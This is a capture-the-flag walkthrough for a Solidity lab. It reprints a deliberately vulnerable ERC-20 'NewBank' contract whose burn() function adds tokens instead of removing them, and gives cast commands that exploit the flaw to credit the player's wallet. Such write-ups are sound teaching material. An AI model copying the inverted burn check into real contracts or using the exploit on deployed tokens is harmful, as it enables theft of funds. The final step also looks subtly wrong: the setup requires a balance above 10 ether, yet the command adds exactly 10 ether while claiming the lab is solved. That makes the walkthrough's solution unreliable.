## Mitigation

The *NewBank Contract* uses a *BetterERC20*, at least that's what they thought, but no, it's not secure at all. As mentioned in the prologue, that *Any deviation from the standard doesn't necessarily introduce vulnerability, but it could*, this is the perfect case of that; let's compare it &nbsp;  
&nbsp;  
```solidity
// NewBank.sol::burn()
    function burn(address _who, uint256 _value) external override {
        require(balanceOf[_who] <= _value, "Insufficient balance to burn");
        balanceOf[_who] += _value;
    }

// How it should be implemented
    function burn(uint256 _value) external {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance to burn");
        
        balanceOf[msg.sender] -= _value; // Decrease balance
        totalSupply -= _value; // Adjust total supply 

        emit Transfer(msg.sender, address(0), _value); // Emit Transfer event to address(0)
    }
```
&nbsp;  
Well, there the *mint()* is designed like that so that player would look over another function to begin with, so we are not going to talk about it, instead we are going to talk about the one that could give us the opening to solve the challenge. *burn()* was meant to permanently remove tokens from circulation, but this one, this one could give you token just like *mint()*. That's why to correctly adopt the ERC-20 standard, the implementation must be at least following the original one, or if there are any deviations from the standard, it needs to be checked to make sure it doesn't introduce any vulnerability.

## Walkthrough

This heist requires you to get at least 10 Ether from the NewBank that they create in the mist of Inju Bank fall. &nbsp;  
&nbsp;  
```solidity
pragma solidity ^0.8.26;

import "./NewBank.sol";

contract Setup{
    NewBank public NB;
    address public player;

    constructor(uint256 _initialSupply) {
        NB = new NewBank(_initialSupply);
    }

    function setPlayer() public{
        require(msg.sender == tx.origin, "Only Human are allowed to be Player");
        player = msg.sender;
    }

    function isSolved() public view returns(bool){
        return NB.balanceOf(player) > 10 ether;
    }
}
```
&nbsp;  
In the *Setup Contract*, we can know that the *isSolved()* function requires us to first *setPlayer()*, and it can only be an EOA, meaning we can't use any Exploit Contract here. Now let's see other files that were also given to us, *BetterERC20.sol* and *NewBank.sol*, We are going to see the *BetterERC20.sol* first. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IBetterERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool);

    function approve(address _spender, uint256 _value) external returns (bool);

    function mint(uint256 _value) external;

    function burn(address _who, uint256 _value) external;

    function owner() external view returns (address);

    function balanceOf(address _who) external view returns (uint256);

    function allowance(
        address _owner,
        address _spender
    ) external view returns (uint256);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
```
&nbsp;  
It turns out it's not a contract but an interface, and to be precise, it's an ERC20 interface. Knowing that we are working with an ERC Standard makes the scope of search much easier. What we need to be focused on here is a misimplementation or override of the ERC20 original function. For this, let's see the *NewBank Contract*. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IBetterERC20} from "./BetterERC20.sol";

contract NewBank is IBetterERC20{
    address public override owner;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    string public override name = "NewBank Token";
    string public override symbol = "NBT";
    uint8 public override decimals = 18;

    constructor(uint256 _initialSupply) {
        owner = msg.sender;
        balanceOf[msg.sender] = _initialSupply;
    }

    function transfer(address _to, uint256 _value) external override returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) external override returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        return true;
    }

    function approve(address _spender, uint256 _value) external override returns (bool) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function mint(uint256 _value) external override {
        require(msg.sender == owner, "Only Owner are allowed to mint!");
        balanceOf[msg.sender] += _value;
    }

    function burn(address _who, uint256 _value) external override {
        require(balanceOf[_who] <= _value, "Insufficient balance to burn");
        balanceOf[_who] += _value;
    }
    
}
```
&nbsp;  
After viewing all the functions here, it seems almost everything is okay except the *burn()* function. *burn()* usually removes a token from the supply and deducts the balance, but this time it's adding it instead of deducting it, so this is the flaw. &nbsp;  
&nbsp;  
We already found the way to get ourselves some balance by calling *burn()* with the value of address pointing to our wallet with the value of 10 Ether, so let's just do that! &nbsp;  
&nbsp;  
```bash
// Getting the NewBank Address
cast call -r $RPC_URL $SETUP_ADDR "NB()"

// Get Ourselves 10 Ether
cast send -r $RPC_URL --private-key $PK $NB_ADDR "burn(address,uint256)" $WALLET_ADDR 10000000000000000000
```
&nbsp;  
By running the commands above in your terminal, you should've solved the lab!
